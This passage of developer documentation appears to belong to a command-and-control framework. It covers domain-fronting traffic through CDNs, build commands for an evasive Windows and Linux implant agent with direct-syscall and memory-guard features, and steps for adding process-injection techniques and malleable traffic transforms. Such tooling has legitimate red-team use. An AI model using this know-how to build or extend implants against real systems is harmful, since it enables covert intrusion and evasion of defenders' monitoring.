- CDN edge nodes route based on `Host` header to the correct origin
- Network monitoring sees only connections to legitimate CDN domains

---

## Building and Development

### Build Commands

```bash
# Full workspace check
cargo check --workspace

# Build server (release)
cargo build --release --package orchestra-server

# Build agent for Windows (with HTTP transport)
cargo build --release --package agent \
    --target x86_64-pc-windows-gnu \
    --features "http-transport,outbound-c,direct-syscalls,memory-guard"

# Build agent for Linux
cargo build --release --package agent \
    --features "http-transport,outbound-c" \
    --target x86_64-unknown-linux-gnu

# Build redirector
cargo build --release --package redirector

# Build console
cargo build --release --package console

# Build launcher
cargo build --release --package launcher
```

### Test Commands

```bash
# Run all tests
cargo test --workspace

# Test specific crate
cargo test --package agent --features http-transport
cargo test --package common
cargo test --package orchestra-server
```

### Adding New Injection Techniques

1. Create a new file in `agent/src/injection/` implementing the `Injector` trait
2. Add the variant to `InjectionMethod` enum in `agent/src/injection/mod.rs`
3. Add the variant to `InjectionTechnique` enum in `agent/src/injection_engine.rs`
4. Update the auto-selection logic in `injection_engine.rs`
5. Add feature gate if platform-specific

### Adding New Transform Types

1. Add variant to `TransformType` enum in `agent/src/malleable.rs`
2. Implement `encode()` and `decode()` methods
3. Add variant to `TransformType` enum in `orchestra-server/src/malleable.rs`
4. Update `from_str_ci()` for TOML parsing in both crates
5. Add validation in profile `validate()`

### Cross-Compilation Setup

```bash
# Install targets
rustup target add x86_64-pc-windows-gnu
rustup target add x86_64-unknown-linux-gnu
rustup target add aarch64-unknown-linux-gnu

# Install MinGW (Windows cross-compile on Linux)
sudo apt install mingw-w64

# Install aarch64 toolchain (ARM64 cross-compile)
sudo apt install gcc-aarch64-linux-gnu
```

### Development Scripts

| Script | Purpose |
|--------|---------|
| `scripts/quickstart.sh` | One-command clone → running system |
| `scripts/setup.sh` | Interactive setup wizard |
| `scripts/setup.ps1` | PowerShell setup wizard |
| `scripts/quickbuild.sh` | Quick payload build |
| `scripts/verify-setup.sh` | Verify build environment |
| `scripts/generate-certs.sh` | Generate self-signed TLS certs |
| `scripts/dev-start.sh` | Start server + dev-server |
| `scripts/package.sh` | Package release artifacts |
